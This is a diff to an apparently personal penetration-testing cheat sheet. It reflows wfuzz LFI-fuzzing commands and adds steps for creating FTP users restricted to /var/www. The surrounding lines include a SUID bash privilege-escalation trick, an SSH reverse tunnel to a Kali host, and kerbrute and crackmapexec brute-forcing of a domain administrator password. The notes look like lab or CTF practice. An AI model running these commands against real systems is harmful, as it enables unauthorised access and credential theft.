@@ -136,14 +136,8 @@ chmod +s /bin/bash
 ```ssh -R 192.168.10.101:8081:127.0.0.1:8080 root@<KALI IP> ```
 
 #### Fuzzing LFI
-> 1. ``` wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
-test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http
-://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x8
-6_64; rv:78.0) Gecko/20100101 Firefox/78.0" ```
-> 1. ``` wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
-test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http
-://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x8
-6_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP ```
+> 1. ``` wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" ```
+> 1. ``` wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP ```
   
 #### Subdomain enum 
 > 1. ``` wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.local" --hw 2867 -t 50 192.168.10.33 ```
@@ -263,3 +257,10 @@ es-shortlist.txt```
 > 2. Try bruteforcing password for a user ```/home/jon/Downloads/kerbrute_linux_amd64 bruteuser --dc 192.168.10.39 -d controller.local /usr/share/wordlists/rockyou.txt adminis
 trator```
 > 3. Using crackmap exec to bruteforce a user password ```crackmapexec smb 192.168.10.39 -u administrator -d controller.local -p /usr/share/wordlists/rockyou.txt```
+
+###Create multiple FTP users, they do not have SSH shell and add them in same group (ftp2100). Allow this group ftp2100 to edit/upload/write to /var/www/ path
+> 1. ``` sudo echo "/bin/false" >> /etc/shells ```
+> 1. ``` sudo addgroup ftp2100 ```
+> 1. ``` sudo adduser skinnyFTP --shell /bin/false --home /var/www --ingroup ftp2100 ```
+> 1. ``` sudo passwd skinnyFTP ```
+> 1. ``` sudo chgrp -R ftp2100 /var/www/ ```
